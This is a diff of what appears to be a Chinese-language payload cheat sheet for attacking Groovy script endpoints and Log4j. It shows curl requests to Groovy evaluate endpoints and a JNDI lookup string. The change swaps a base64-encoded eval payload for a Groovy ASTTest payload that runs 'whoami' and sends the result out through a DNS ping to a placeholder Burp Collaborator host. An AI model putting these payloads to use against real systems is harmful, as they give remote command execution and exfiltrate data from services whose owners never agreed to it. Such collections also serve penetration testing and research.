@@ -22,7 +22,7 @@ curl 127.0.0.1:8080/groovy/parseClass -H "Content-Type: text/plain" --data-binar
 curl 127.0.0.1:8080/groovy/evaluate -H "Content-Type: text/plain" --data-binary @script.vy
 ```
 
-测试脚本 - 绕过沙箱
+测试脚本 - AST
 
 ```groovy
 @groovy.transform.ASTTest(value={
@@ -58,10 +58,18 @@ Logger logger = LogManager.getLogger(getClass());
 logger.info ('a={}', '${jndi:ldap://127.0.0.1:1389/a}');
 ```
 
-eval
+[dnslog + 结果上报](https://security.humanativaspa.it/groovy-template-engine-exploitation-notes-from-a-real-case-scenario/)
 
 ```groovy
-this.evaluate(new String(java.util.Base64.getDecoder().decode("QGdyb292eS50cmFuc2Zvcm0uQVNUVGVzdCh2YWx1ZT17YXNzZXJ0IGphdmEubGFuZy5SdW50aW1lLmdldFJ1bnRpbWUoKS5leGVjKCJvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwIil9KWRlZiB4")))
+import groovy.*;
+
+@groovy.transform.ASTTest(value={
+cmd = "whoami";
+out = new java.util.Scanner(java.lang.Runtime.getRuntime().exec(cmd.split(" ")).getInputStream()).useDelimiter("\\A").next()
+cmd2 = "ping " + out.replaceAll("[^a-zA-Z0-9]","") + ".XXXXX.burpcollaborator.net";
+java.lang.Runtime.getRuntime().exec(cmd2.split(" "))
+})
+def x
 ```
 
 #### ognl
